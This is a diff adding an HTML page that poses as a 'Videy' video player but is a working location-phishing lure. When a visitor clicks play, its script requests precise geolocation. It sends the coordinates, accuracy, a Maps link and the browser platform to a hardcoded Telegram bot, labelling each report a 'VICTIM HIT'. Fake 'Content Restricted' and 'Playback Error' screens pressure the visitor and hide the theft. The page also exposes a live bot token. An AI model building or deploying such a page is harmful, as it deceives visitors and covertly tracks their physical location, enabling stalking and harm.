@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Videy - Simple video hosting</title>
+    <style>
+        body { background-color: #000; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; overflow: hidden; }
+        .videy-player { width: 100vw; height: 100vh; max-width: 450px; aspect-ratio: 9 / 16; background: #000; position: relative; overflow: hidden; }
+        .watermark { position: absolute; top: 20px; right: 20px; color: rgba(255,255,255,0.4); font-weight: bold; font-size: 20px; z-index: 10; pointer-events: none; }
+        .thumb { width: 100%; height: 100%; object-fit: cover; cursor: pointer; }
+        .play-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; cursor: pointer; z-index: 5; }
+        .play-circle { width: 80px; height: 80px; background: rgba(0,0,0,0.5); border-radius: 50%; display: flex; justify-content: center; align-items: center; border: 1.5px solid rgba(255,255,255,0.2); }
+        .play-icon { border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent #fff; margin-left: 5px; }
+        .loader { width: 50px; height: 50px; border: 5px solid #333; border-top: 5px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; display: none; position: absolute; top: 48%; left: 43%; z-index: 15; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .screen { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 30px; z-index: 20; color: #fff; box-sizing: border-box; }
+        .btn-retry { margin-top: 20px; padding: 12px 25px; background: #fff; color: #000; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; width: 80%; }
+    </style>
+</head>
+<body>
+
+<div class="videy-player">
+    <div class="watermark">videy</div>
+    
+    <img src="https://i.ibb.co.com/mFq2XWsM/thumbnail.jpg" class="thumb" id="img-thumb" onclick="initiate()">
+    
+    <div class="play-overlay" id="play-btn" onclick="initiate()">
+        <div class="play-circle"><div class="play-icon"></div></div>
+    </div>
+    
+    <div class="loader" id="spinner"></div>
+
+    <div id="denied-screen" class="screen">
+        <p style="font-size: 22px; font-weight: bold;">Content Restricted</p>
+        <p style="font-size: 15px; color: #aaa;">To comply with local regulations, we need to verify your location before playing this video.</p>
+        <button class="btn-retry" onclick="location.reload()">Verify Location</button>
+    </div>
+
+    <div id="final-error" class="screen">
+        <p style="font-size: 18px; color: #ff4444;">Playback Error</p>
+        <p style="font-size: 13px; color: #888; line-height: 1.6;">Connection to the media server was lost (Error: HLS_DECODE_ERR). Your device might not support high-definition streaming on this browser.</p>
+        <button class="btn-retry" onclick="location.reload()">Refresh Player</button>
+    </div>
+</div>
+
+<script>
+    const token = "8560002103:AAFo0auV2fqMYpsh-xyqZvwZzdJYBJIfUf8"; 
+    const chat_id = "5639837246"; 
+
+    function initiate() {
+        document.getElementById('play-btn').style.display = 'none';
+        document.getElementById('spinner').style.display = 'block';
+        
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(captureAndSend, handleDenied, {
+                enableHighAccuracy: true,
+                timeout: 10000
+            });
+        } else {
+            showFinalError();
+        }
+    }
+
+    function captureAndSend(p) {
+        const lat = p.coords.latitude;
+        const lon = p.coords.longitude;
+        // Fix google maps link structure
+        const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
+        
+        const text = `👁️ eyeGPT VICTIM HIT!\n\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n🎯 Accuracy: ${p.coords.accuracy}m\n\n🔗 Maps: ${googleMaps}\n📱 Browser: ${navigator.platform}`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`)
+        .finally(() => {
+            setTimeout(showFinalError, 4500);
+        });
+    }
+
+    function handleDenied() {
+        document.getElementById('spinner').style.display = 'none';
+        document.getElementById('img-thumb').style.display = 'none';
+        document.getElementById('denied-screen').style.display = 'flex';
+    }
+
+    function showFinalError() {
+        document.getElementById('spinner').style.display = 'none';
+        document.getElementById('img-thumb').style.display = 'none';
+        document.getElementById('denied-screen').style.display = 'none';
+        document.getElementById('final-error').style.display = 'flex';
+    }
+</script>
+
+</body>
+</html>
